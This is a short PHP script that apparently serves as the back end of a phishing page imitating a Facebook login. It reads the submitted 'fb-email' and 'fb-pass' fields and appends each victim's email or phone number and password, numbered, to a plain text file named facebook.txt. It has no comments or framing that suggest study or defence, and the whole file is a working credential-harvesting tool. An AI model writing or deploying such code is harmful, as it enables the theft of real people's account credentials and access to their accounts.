<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $emailOrPhone = $_POST["fb-email"];
    $password = $_POST["fb-pass"];

    // Open the file 'facebook.txt' for writing
    $file = fopen("facebook.txt", "a"); // Use "a" mode to append data to the file

    if ($file) {
        // Get the current number of lines in the file
        $lineCount = count(file("facebook.txt"));

        // Write the email/phone and password as numbered lines
        fwrite($file, "Entry #" . ($lineCount + 1) . ":\n");
        fwrite($file, "Email/Phone: " . $emailOrPhone . "\n");
        fwrite($file, "Password: " . $password . "\n");
        fwrite($file, "\n"); // Add a blank line to separate entries

        // Close the file
        fclose($file);

        echo "success";
    } else {
        echo "failed";
    }
}
?>
